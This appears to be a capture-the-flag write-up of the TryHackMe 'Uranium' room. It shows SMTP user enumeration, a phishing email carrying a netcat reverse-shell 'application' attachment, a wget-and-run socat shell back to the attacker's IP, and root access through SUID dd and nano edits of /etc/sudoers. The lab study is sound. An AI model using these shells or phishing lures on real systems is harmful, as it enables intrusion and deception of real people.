# Uranium CTF

## Introduction

Welcome to my another writeup! In this TryHackMe [Uranium CTF](https://tryhackme.com/room/uranium) room, you'll learn: Phishing, social engineering and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold: Phishing](#initial-foothold)**
3. **[Privilege Escalation: hakanbey to kral4](#privilege-escalation)**
4. **[Privilege Escalation: kral4 to root](#kral4-to-root)**
5. **[Conclusion](#conclusion)**

## Background

> Uranium CTF
> 
> Difficulty: Hard

---

We have reached out a account one of the employees [hakanbey](https://twitter.com/hakanbe40520689)

In this room, you will learn about one of the phishing attack methods. I tried to design a phishing room (cronjobs and services) as much as I could.

Special Thanks to kral4 for helping us to make this room  

Note: Please do not attack the given twitter account.

## Service Enumeration

**In this room's description, it gave us one of their employees' [twitter](https://twitter.com/hakanbe40520689) account.**

Let's enumerate his account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210091721.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210091818.png)

In here, we see there is a domain for this room's company!

- Found domain: `uranium.thm`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210091920.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210091932.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210091942.png)

So, we can send an application file (`filename: "application"`) to user `hakanbey` mail account. ***Then, he'll open and review all applications one by one!***

Armed with above information, **we can try to phish user `hakanbey`, which will then gain initial foothold?**

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:23:46(HKT)]
└> export RHOSTS=10.10.180.31  
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:23:57(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a13cd7e9d0854033d507163208633105 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMwJfFdIx+ajk4m+SaA9FCONx/arQgXZx22oViZpzp6QSuMYI3u4GXubPf+P/1AKjrdTZ2UtLt3HszSNuf3V/RMQgvXYrPGFmClvfnZZ88an/oz38l4aGTnZ1LJ8upLU90METx4YXcA9uM3u0dECXfUMqFHX+wwFxP/WKUJ7lX3Ae7H+Uj2Bwrw76d8Ndwf3a/EDZ6gTzYTgrgprZQeBbriJM9yrjljakLNCajdDzjtDSQs+wXwme2MXx8u7aAZ4ofL7cuGxCPil2R92HWrKomMQ7Iyd9SMre3rCLhSOhbYnJGTwl3P6fEqCPqp2shMO2AYVrgz0jC6ou8iM3jGe4t
|   256 24810c3a9155a0659e36587151136c34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBZPRLpPW1xp0xWpgkGvpFwR6tKPTMRvjkAbiwoPC/qCKUYg2p06XDFCMHNDmuqIC5SHvnqZqM0EdwJIuUkFvIE=
|   256 c2942b0d8ea953f6ef34dbf1436cc17e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFY55KAy8LZ+FNH0gc/IzoPlL/gQDwtvUMTzmQTd8MAj
25/tcp open  smtp    syn-ack Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=uranium
| Subject Alternative Name: DNS:uranium
| Issuer: commonName=uranium
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-09T21:40:53
| Not valid after:  2031-04-07T21:40:53
| MD5:   293dbef32fee6092c0d72a67ea27367c
| SHA-1: 0a0c26e0ae3c723e538d3c216b40c84cf9e78fdb
| -----BEGIN CERTIFICATE-----
| MIIC0zCCAbugAwIBAgIUIVXdlC2OCz8mRhqtv01MouzQ0ZswDQYJKoZIhvcNAQEL
| BQAwEjEQMA4GA1UEAwwHdXJhbml1bTAeFw0yMTA0MDkyMTQwNTNaFw0zMTA0MDcy
| MTQwNTNaMBIxEDAOBgNVBAMMB3VyYW5pdW0wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCpxCDhZoI2WVRkeoeXHBA1Y3LnA0WNjAnH1HyeYwzhKeVekmip
| m3bzvH0e3Z9D9zyf1mnhYnV4i4yA8I+Jp/Cx1Gc9VXvD2cAW4azHdCZBjR6arGCF
| 14gxtdrgiBSdKoMqUo2T9tlfqfnrGOTcc70KYXBJ6tjIHPrFmeXRUvlZWhsF0i1R
| zWqWLNB3Wy7O2yYP2SV8MLjoEGi2ZeqSMbYkhMKTbS7VSLNISO9ax2Wxb5j5lELX
| jLox6/nPueJkLR37YbjDztdZ3Lpz8FXUqymz+OWZq2MLYfde2Zn7cA7zFgeCfOJM
| HhGN9BC046EBW60RVFhWaczTHsRALnWvQ5VfAgMBAAGjITAfMAkGA1UdEwQCMAAw
| EgYDVR0RBAswCYIHdXJhbml1bTANBgkqhkiG9w0BAQsFAAOCAQEAj1F/S1v2EFAL
| H1FG/SWNlqsD9KKwUDSceiHicEz8IE9YU+Vg1NRxluYYpkDbfyrCVBPW//JZJNd2
| jpCObLaQRxZ/4QCa+t4/7Nlue8IiWzax8nEVMUV8clFGlBmktfsx7d/iyjDeGq2H
| VE3p6nFpZFmGmCvYfue9IcZWduFbOIWzf2XvnGnaHxYvccBry7tFGW5F93i3asV3
| UQqT8xZ+eaxzijdoEl9klp/Ee4R2b8bjHMDt7SFzvQAGzL3j1mFPY9qA78K9eNv3
| vHgqdChT9jryHVBEcLiTTPsfNRcARQeOr4O0wGdlQX6E3FRbPn3JpM96Do8+/kJd
| r/RWkJhbQQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Uranium Coin
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 3 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
25                | Postfix smtpd
80                | Apache httpd 2.4.29 ((Ubuntu))

**Since we found a domain in user `hakanbey`'s twitter account, we can add that to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:24:40(HKT)]
└> echo "$RHOSTS uranium.thm" | sudo tee -a /etc/hosts
```

### SMTP on Port 25

**In here, we can use `nc` to connect to the mail server, and enumerate users:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:30:55(HKT)]
└> nc -nv $RHOSTS 25
(UNKNOWN) [10.10.180.31] 25 (smtp) open
220 uranium ESMTP Postfix (Ubuntu)
VRFY hakanbey
252 2.0.0 hakanbey
VRFY test
550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
```

We can confirm there is a user called `hakanbey`.

Also, we can send an evil application to him according to `hakanbey`'s twitter account.

However, before we do that, let's keep enumerate.

### HTTP on Port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210093741.png)

**This page seems empty, let's enumerate hidden directories and files via `gobuster`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:38:19(HKT)]
└> gobuster dir -u http://uranium.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/images               (Status: 301) [Size: 311] [--> http://uranium.thm/images/]
/assets               (Status: 301) [Size: 311] [--> http://uranium.thm/assets/]
/server-status        (Status: 403) [Size: 276]
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:41:08(HKT)]
└> gobuster dir -u http://uranium.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 
[...]
/index.html           (Status: 200) [Size: 10351]
/LICENSE.txt          (Status: 200) [Size: 17128]
/.htaccess            (Status: 403) [Size: 276]
/.                    (Status: 200) [Size: 10351]
/.html                (Status: 403) [Size: 276]
/README.txt           (Status: 200) [Size: 771]
/.htpasswd            (Status: 403) [Size: 276]
/.htm                 (Status: 403) [Size: 276]
/.htpasswds           (Status: 403) [Size: 276]
/.htgroup             (Status: 403) [Size: 276]
/.htaccess.bak        (Status: 403) [Size: 276]
/.htuser              (Status: 403) [Size: 276]
/.ht                  (Status: 403) [Size: 276]
/.htc                 (Status: 403) [Size: 276]
/.htaccess.old        (Status: 403) [Size: 276]
/.htacess             (Status: 403) [Size: 276]
```

Nothing stands out.

**Then fuzz subdomains via `ffuf`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|09:47:57(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://uranium.thm/ -H "Host: FUZZ.uranium.thm" -fw 428 -t 100 
[...]
```

Again, nothing...

## Initial Foothold

Hmm... Let's go back to SMTP.

In SMTP, we can send a mail.

**Let's try to send an application mail with a Bash reverse shell!**

**According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp#sending-an-email-from-linux-console), we can send via `sendEmail` Linux command:**
```shell
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

**Armed with above information, let's first create an "application" file, which is a Netcat reverse shell:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|16:13:17(HKT)]
└> echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.70.81 443 >/tmp/f' > application
```

**Next, setup a `nc` listener:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|16:22:00(HKT)]
└> sudo nc -lnvp 443
listening on [any] 443 ...
```

**Then, send the mail:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|16:30:44(HKT)]
└> sendEmail -t hakanbey@uranium.thm -f siunam@gmail.com -s uranium.thm -u "Application Request" -a application -o tls=no
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

Dear Uranium Coin,

I am writing to apply for the job at your cryptocurrency company. I am confident that my skills and experience make me an ideal candidate for this position. Please find my attached CV, which outlines my qualifications and accomplishments.

I am excited about the opportunity to work at your company and would welcome the chance to discuss more about how I can help bring success.

Thank you for your time and consideration.

Sincerely,
siunam
Feb 10 16:31:32 earth sendEmail[61642]: Message input complete.
Feb 10 16:31:34 earth sendEmail[61642]: Email was sent successfully!
```

> Fun fact: The body message is generated via AI:
> 
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230210163406.png)

**After that, wait for a while and you should get a reverse shell:**
```
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.10|16:22:00(HKT)]
└> sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.8.70.81] from (UNKNOWN) [10.10.180.31] 39422
bash: cannot set terminal process group (1707): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
hakanbey
uranium
uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:be:8f:48:ed:61 brd ff:ff:ff:ff:ff:ff
    inet 10.10.180.31/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2189sec preferred_lft 2189sec
    inet6 fe80::be:8fff:fe48:ed61/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `hakanbey`!

**Stable shell via `socat`:**
```shell
┌[siunam♥earth]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.02.17|15:31:42(HKT)]-[git://master ✗]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:31:27(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/02/17 15:32:28 socat[30122] N opening character device "/dev/pts/2" for reading and writing
2023/02/17 15:32:28 socat[30122] N listening on AF=2 0.0.0.0:4444
```

```shell
hakanbey@uranium:~$ wget http://10.8.70.81:8000/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.8.70.81:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:31:27(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/02/17 15:32:28 socat[30122] N opening character device "/dev/pts/2" for reading and writing
2023/02/17 15:32:28 socat[30122] N listening on AF=2 0.0.0.0:4444
                                                                 2023/02/17 15:32:55 socat[30122] N accepting connection from AF=2 10.10.180.31:40346 on AF=2 10.8.70.81:4444
                                                                  2023/02/17 15:32:55 socat[30122] N starting data transfer loop with FDs [5,5] and [7,7]
                                              hakanbey@uranium:~$ 
hakanbey@uranium:~$ export TERM=xterm-256color
hakanbey@uranium:~$ stty rows 22 columns 107
hakanbey@uranium:~$ ^C
hakanbey@uranium:~$ 
```

**user1.txt:**
```shell
hakanbey@uranium:~$ cat /home/hakanbey/user_1.txt
thm{Redacted}
```

## Privilege Escalation

### hakanbey to kral4

Let's do some basic enumerations!

**System users:**
```shell
hakanbey@uranium:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
hakanbey:x:1000:1000:hakanbey:/home/hakanbey:/bin/bash
kral4:x:1001:1001:,,,:/home/kral4:/bin/bash
web:x:1002:1002:,,,:/home/web:/bin/bash
```

- Found 3 system user: `hakanbey`, `kral4`, `web`

**SUID binaries:**
```shell
hakanbey@uranium:~$ find / -perm -4000 2>/dev/null
[...]
/bin/dd
```

The `/bin/dd` looks sussy!

```shell
hakanbey@uranium:~$ ls -lah /bin/dd
-rwsr-x--- 1 web kral4 75K Apr 23  2021 /bin/dd
```

However, it's only executable via user `web` and group `kral4`... User `hakanbey` can't execute it.

**Listening ports:**
```shell
hakanbey@uranium:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
udp        0      0 10.10.180.31:68          0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
```

- Found internal port: `1234`

**Try to reach it:**
```shell
hakanbey@uranium:~$ curl -s http://127.0.0.1:1234/
NOT AUTHORIZED
```

Hmm... "NOT AUTHORIZED"?

**`hakanbey` home directory:**
```shell
hakanbey@uranium:~$ ls -lah
total 100K
drwxr-xr-x 7 hakanbey hakanbey 4.0K May  4  2021 .
drwxr-xr-x 4 root     root     4.0K Apr 23  2021 ..
lrwxrwxrwx 1 root     root        9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hakanbey hakanbey  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 hakanbey hakanbey 3.7K Apr  4  2018 .bashrc
drwx------ 2 hakanbey hakanbey 4.0K Apr  9  2021 .cache
-rwxrwxr-x 1 hakanbey hakanbey  49K Apr  9  2021 chat_with_kral4
drwxr-x--- 3 hakanbey hakanbey 4.0K Apr 10  2021 .config
drwx------ 4 hakanbey hakanbey 4.0K Apr 10  2021 .gnupg
drwxrwxr-x 3 hakanbey hakanbey 4.0K Apr  9  2021 .local
drwxrwxr-x 2 hakanbey hakanbey 4.0K Feb 10 08:43 mail_file
-rw-r--r-- 1 hakanbey hakanbey  807 Apr  4  2018 .profile
-rw-rw-r-- 1 hakanbey hakanbey   66 Apr  9  2021 .selected_editor
-rw-r--r-- 1 hakanbey hakanbey    0 Apr  9  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 hakanbey hakanbey   38 Apr 10  2021 user_1.txt
```

**What's `chat_with_kral4`?**
```shell
hakanbey@uranium:~$ file chat_with_kral4
chat_with_kral4: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3cf57a90a14e7b2771cb14cd9b1837fe9fa7495b, for GNU/Linux 3.2.0, not stripped
```

It's an ELF 64-bit executable, and it's not stripped.

**Let's use `strings` to list all the strings inside it:**
```shell
hakanbey@uranium:~$ strings chat_with_kral4 

Command 'strings' not found, but can be installed with:

apt install binutils
Please ask your administrator.
```

**Nope. Let's transfer the binary then:**
```shell
hakanbey@uranium:~$ python3 -m http.server 8000
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:34:44(HKT)]
└> wget http://$RHOSTS:8000/chat_with_kral4
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:34:55(HKT)]
└> chmod +x chat_with_kral4
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:36:32(HKT)]
└> strings chat_with_kral4
[...]
 while calling a Python object
NULL result without error in PyObject_Call
client.c
globals != NULL
tstate != NULL
__pyx_pyframe_localsplus_offset
Interpreter change detected - this module can only be loaded into one interpreter per process.
[...]
connection terminated
kral4 disconnected
cline_in_traceback
Connection Refused
sendnreceive
SOCK_STREAM
client.pyx
127.0.0.1
username
msg2send
hakanbey:
PASSWORD :
recvmsg
connect
AF_INET
socket
__import__
[...]
```

However, it doesn't have any password string in there...

Also, looks like the binary is compiled in Python called pyx?

I used Ghidra try to reverse engineer it, but no dice.

Alright, let's take a step back.

**After keep enumerating, I found a pcap file:**
```shell
hakanbey@uranium:~$ ls -lah /var/log/
[...]
-rw-r--r--   1 root      root            1.9K Apr 24  2021 hakanbey_network_log.pcap
[...]
```

**Let's transfer it!**
```shell
hakanbey@uranium:/var/log$ python3 -m http.server 8000
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:48:47(HKT)]
└> wget http://$RHOSTS:8000/hakanbey_network_log.pcap      
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:56:26(HKT)]
└> file hakanbey_network_log.pcap 
hakanbey_network_log.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

A pcap file, is a file that captures all the packets' traffics.

**We can open it via WireShark:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Uranium-CTF)-[2023.02.17|15:56:43(HKT)]
└> wireshark hakanbey_network_log.pcap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217155759.png)

In here, we see there are 20 packets.

**In WireShark, we can follow TCP streams:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217155905.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217155922.png)

Boom! We found the password for the chat app!

**Since we have the correct password, let's use that chat app!**
```shell
hakanbey@uranium:/var/log$ cd ~
hakanbey@uranium:~$ ./chat_with_kral4 
PASSWORD :{Redacted}
kral4:hi hakanbey

->
```

As you can see, the user `kral4` sent a message to us.

Based on the conversation in the pcap file, user `hakanbey` forgot his password, and user `kral4` will send it to `hakanbey`.

**Let's continue the conversation!**
```shell
->hi
hakanbey:hi
kral4:how are you?

->I'm good!
hakanbey:I'm good!
kral4:what now? did you forgot your password again

->
```

**Now, if I say "yes", will `kral4` give us the password?**
```shell
->yes 
hakanbey:yes
kral4:okay your password is {Redacted} don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated
```

Nice!!

Now we have user `hakanbey`'s password!

**Let's check out Sudo permission:**
```shell
hakanbey@uranium:~$ sudo -l
[sudo] password for hakanbey: 
Matching Defaults entries for hakanbey on uranium:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
```

Oh! User `hakanbey` can run `/bin/bash` as user `kral4`!

**Let's spawn a bash shell as user `kral4`!**
```shell
hakanbey@uranium:~$ sudo -u kral4 /bin/bash
kral4@uranium:~$ whoami;hostname;id;ip a
kral4
uranium
uid=1001(kral4) gid=1001(kral4) groups=1001(kral4)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:c5:fc:b9:fc:6f brd ff:ff:ff:ff:ff:ff
    inet 10.10.180.31/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2865sec preferred_lft 2865sec
    inet6 fe80::c5:fcff:feb9:fc6f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `kral4`!

**user2.txt:**
```shell
kral4@uranium:~$ cat /home/kral4/user_2.txt 
thm{Redacted}
```

### kral4 to root

**According to the enumeration result in user `hakanbey` session, we found `/bin/dd` binary has a SUID sticky bit, and it's owned by user `web`:**
```shell
kral4@uranium:~$ ls -lah /bin/dd
-rwsr-x--- 1 web kral4 75K Apr 23  2021 /bin/dd
```

That being said, we could escalate our privilege to user `web`!

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/dd/#suid), we can write and read any file as user `web`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217161627.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217162622.png)

**web_flag.txt:**
```shell
kral4@uranium:~$ /bin/dd if=/var/www/html/web_flag.txt
thm{Redacted}
[...]
```

However, there's nothing we can do to escalate privilege to user `web` beside reading the flag...

**In `/var/mail`, we can see there are 2 mail files:**
```shell
kral4@uranium:~$ ls -lah /var/mail/
total 16K
drwxrwsr-x  2 root     mail 4.0K Feb 17 08:26 .
drwxr-xr-x 14 root     root 4.0K Apr  9  2021 ..
-rw-------  1 hakanbey mail  938 Feb 17 08:26 hakanbey
-rw-------  1 kral4    mail 1.1K Apr 24  2021 kral4
```

**Let's read `kral4`'s mail!**
```shell
kral4@uranium:~$ cat /var/mail/kral4 
[...]
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
[...]
I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.
[...]
```

**So, there's a SUID `nano` binary in `kral4` home directory?**
```shell
kral4@uranium:~$ cd /home/kral4/
kral4@uranium:/home/kral4$ ls -lah
total 140K
drwxr-x--- 3 kral4 kral4 4.0K May  4  2021 .
drwxr-xr-x 4 root  root  4.0K Apr 23  2021 ..
lrwxrwxrwx 1 root  root     9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kral4 kral4  220 Apr  9  2021 .bash_logout
-rw-r--r-- 1 kral4 kral4 3.7K Apr  9  2021 .bashrc
-rwxr-xr-x 1 kral4 kral4 108K Apr  9  2021 chat_with_hakanbey
-rw-r--r-- 1 kral4 kral4    5 Feb 17 08:08 .check
drwxrwxr-x 3 kral4 kral4 4.0K Apr 10  2021 .local
-rw-r--r-- 1 kral4 kral4  807 Apr  9  2021 .profile
-rw-rw-r-- 1 kral4 kral4   38 Apr 10  2021 user_2.txt
```

**Hmm... Maybe we need to copy the `nano` binary?**
```shell
kral4@uranium:/home/kral4$ cp /bin/nano .
kral4@uranium:/home/kral4$ ls -lah nano 
-rwxr-xr-x 1 kral4 kral4 241K Feb 17 08:31 nano
```

**Oh! Since we have SUID permission in `/bin/dd`, we can just modify the `index.html`!**
```shell
kral4@uranium:/home/kral4$ echo "hacked" | /bin/dd of=/var/www/html/index.html
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217163350.png)

```shell
kral4@uranium:/home/kral4$ 
You have new mail in /var/mail/kral4

kral4@uranium:/home/kral4$ cat /var/mail/kral4
[...]
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
[...]
I think our index page has been hacked again. You know how to fix it, I am giving authorization.
[...]
```

```shell
kral4@uranium:/home/kral4$ ls -lah nano 
-rwsrwxrwx 1 root root 241K Feb 17 08:31 nano
```

Nice! We now have SUID sticky bit on binary `nano`!

Also, it's owned by root!

**That being said, we can escalate our privilege to root by modifing `/etc/sudoers`!**
```shell
kral4@uranium:/home/kral4$ /home/kral4/nano /etc/sudoers
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Uranium-CTF/images/Pasted%20image%2020230217164407.png)

```shell
kral4@uranium:/home/kral4$ sudo -l
Matching Defaults entries for kral4 on uranium:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kral4 may run the following commands on uranium:
    (root) NOPASSWD: /bin/bash
```

**Boom! We can spawn a Bash shell as root!**
```shell
kral4@uranium:/home/kral4$ sudo /bin/bash
root@uranium:/home/kral4# whoami;hostname;id;ip a
root
uranium
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:c5:fc:b9:fc:6f brd ff:ff:ff:ff:ff:ff
    inet 10.10.180.31/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2609sec preferred_lft 2609sec
    inet6 fe80::c5:fcff:feb9:fc6f/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root@uranium:/home/kral4# cat /root/root.txt 
thm{Redacted}
```

# Conclusion

What we've learned:

1. OSINT (Open-source intelligence) In Twitter
2. Sending A Phishing Email To Gain Initial Foothold
3. Leaking Password Via Social Engineering
4. Horizontal Privilege Escalation via Misconfigurated Sudo Permission
5. Analyzing Traffics Via WireShark In A `pcap` File
6. Read & Write Files Via SUID `dd` Binary
7. Vertical Privilege Escalation via SUID `nano` Binary